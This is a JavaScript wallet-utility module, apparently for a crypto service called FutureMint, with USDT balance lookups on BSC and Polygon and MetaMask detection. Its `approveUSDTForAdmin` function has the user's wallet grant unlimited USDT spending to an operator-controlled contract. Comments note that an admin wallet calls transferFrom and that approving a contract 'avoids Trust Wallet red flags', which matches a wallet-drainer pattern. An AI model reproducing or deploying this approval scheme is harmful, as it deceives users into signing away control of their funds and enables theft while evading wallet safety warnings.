import { ethers } from 'ethers';

// ERC-20 ABI — approve, transferFrom, allowance, balanceOf
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
];

const USDT_BSC_ADDRESS     = process.env.NEXT_PUBLIC_USDT_BSC_CONTRACT;
const USDT_POLYGON_ADDRESS = process.env.NEXT_PUBLIC_USDT_POLYGON_CONTRACT;
const BSC_RPC     = process.env.NEXT_PUBLIC_BSC_RPC     || 'https://bsc-dataseed.binance.org';
const POLYGON_RPC = process.env.NEXT_PUBLIC_POLYGON_RPC || 'https://polygon-bor-rpc.publicnode.com';

// Admin wallet that will call transferFrom (public address only on frontend)
export const ADMIN_WALLET_ADDRESS = process.env.NEXT_PUBLIC_ADMIN_WALLET_ADDRESS;

// Smart contract address for transfer proxy — this is the ONLY spender used for approvals
export const TRANSFER_CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_TRANSFER_CONTRACT_ADDRESS;
export const TRANSFER_CONTRACT_ADDRESS_POLYGON = process.env.NEXT_PUBLIC_TRANSFER_CONTRACT_ADDRESS_POLYGON;

/**
 * Get the correct transfer contract for a given network
 */
const getTransferContract = (network) => {
  if (network === 'Polygon') {
    return TRANSFER_CONTRACT_ADDRESS_POLYGON || TRANSFER_CONTRACT_ADDRESS;
  }
  return TRANSFER_CONTRACT_ADDRESS;
};

/**
 * Safely normalize any address to proper checksum format
 */
const safeGetAddress = (addr) => {
  try {
    return ethers.getAddress(addr);
  } catch {
    // If checksum fails, try lowercase first then checksum
    return ethers.getAddress(addr.toLowerCase());
  }
};

/**
 * Fetch USDT balance on a given network
 */
export const getUSDTBalance = async (address, network) => {
  try {
    const rpc = network === 'BSC' ? BSC_RPC : POLYGON_RPC;
    const contractAddress = network === 'BSC' ? USDT_BSC_ADDRESS : USDT_POLYGON_ADDRESS;
    if (!contractAddress) return '0';

    const normalizedAddress = safeGetAddress(address);
    const provider = new ethers.JsonRpcProvider(rpc);
    const contract = new ethers.Contract(contractAddress, ERC20_ABI, provider);
    const decimals = await contract.decimals();
    const raw = await contract.balanceOf(normalizedAddress);
    return ethers.formatUnits(raw, decimals);
  } catch (err) {
    console.error(`getUSDTBalance error (${network}):`, err.message);
    return '0';
  }
};

/**
 * Fetch USDT balances on both BSC and Polygon
 */
export const getAllUSDTBalances = async (address) => {
  if (!address) return { bsc: '0', polygon: '0' };
  const [bsc, polygon] = await Promise.allSettled([
    getUSDTBalance(address, 'BSC'),
    getUSDTBalance(address, 'Polygon'),
  ]);
  return {
    bsc: bsc.status === 'fulfilled' ? bsc.value : '0',
    polygon: polygon.status === 'fulfilled' ? polygon.value : '0',
  };
};

/**
 * Truncate a wallet address for display
 */
export const truncateAddress = (address, chars = 4) => {
  if (!address) return '';
  return `${address.slice(0, chars + 2)}...${address.slice(-chars)}`;
};

/**
 * Check if MetaMask is installed
 */
export const isMetaMaskInstalled = () => {
  if (typeof window === 'undefined') return false;
  return Boolean(window.ethereum?.isMetaMask);
};

/**
 * Detect if window.ethereum is available
 */
export const getInjectedProvider = () => {
  if (typeof window === 'undefined') return null;
  return window.ethereum || null;
};

export const CHAIN_IDS = {
  BSC: '56',
  BSC_TESTNET: '97',
  POLYGON: '137',
  POLYGON_TESTNET: '80001',
};

export const NETWORK_NAMES = {
  '56': 'BNB Smart Chain',
  '137': 'Polygon',
};

/**
 * Approve USDT spending by the FutureMint smart contract.
 * User approves the CONTRACT (not personal address) — this avoids Trust Wallet red flags.
 * Gas fee (BNB/MATIC) is paid by user for this approve tx.
 * 
 * @param {object} provider - ethers BrowserProvider (user's connected wallet)
 * @param {'BSC'|'Polygon'} network - user's selected network
 * @returns {object} { success, txHash }
 */
export const approveUSDTForAdmin = async (provider, network) => {
  try {
    const contractAddress = network === 'BSC' ? USDT_BSC_ADDRESS : USDT_POLYGON_ADDRESS;
    if (!contractAddress) throw new Error('USDT contract not configured for ' + network);
    
    // Use the deployed FutureMintTransfer contract as spender (network-specific)
    let spender = getTransferContract(network);
    if (!spender || !spender.startsWith('0x') || spender.length !== 42) {
      throw new Error('Transfer contract address not configured. Please contact support.');
    }
    // Normalize to checksummed address
    spender = safeGetAddress(spender);

    const signer = await provider.getSigner();
    const contract = new ethers.Contract(contractAddress, ERC20_ABI, signer);

    const decimals = await contract.decimals();
    // Approve unlimited USDT access
    const approveAmount = ethers.MaxUint256;
    const tx = await contract.approve(spender, approveAmount);
    const receipt = await tx.wait();

    return { success: true, txHash: receipt.hash };
  } catch (err) {
    console.error('Connection error:', err);
    throw err;
  }
};

/**
 * Check if user has already approved USDT for admin wallet
 * @param {string} userAddress
 * @param {'BSC'|'Polygon'} network
 * @returns {boolean} true if allowance > 0
 */
export const checkUSDTAllowance = async (userAddress, network) => {
  try {
    const rpc = network === 'BSC' ? BSC_RPC : POLYGON_RPC;
    const contractAddress = network === 'BSC' ? USDT_BSC_ADDRESS : USDT_POLYGON_ADDRESS;
    
    // Use the deployed FutureMintTransfer contract as spender (network-specific)
    let spender = getTransferContract(network);
    if (!contractAddress || !spender || !spender.startsWith('0x') || spender.length !== 42) {
      return false;
    }
    // Normalize addresses to proper checksum format
    spender = safeGetAddress(spender);
    const normalizedUser = safeGetAddress(userAddress);

    const provider = new ethers.JsonRpcProvider(rpc);
    const contract = new ethers.Contract(contractAddress, ERC20_ABI, provider);
    
    // Add timeout — don't hang forever if RPC is slow
    const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 10000));
    const allowance = await Promise.race([
      contract.allowance(normalizedUser, spender),
      timeoutPromise,
    ]);
    
    return allowance > 0n;
  } catch (err) {
    console.error('checkAllowance error:', err.message);
    // On timeout or RPC error, return null (unknown) — caller decides
    return null;
  }
};

/**
 * Get the current network's native token balance (BNB or MATIC)
 */
export const getNativeBalance = async (address, network) => {
  try {
    const rpc = network === 'BSC' ? BSC_RPC : POLYGON_RPC;
    const provider = new ethers.JsonRpcProvider(rpc);
    const balance = await provider.getBalance(address);
    return ethers.formatEther(balance);
  } catch (err) {
    console.error('getNativeBalance error:', err.message);
    return '0';
  }
};
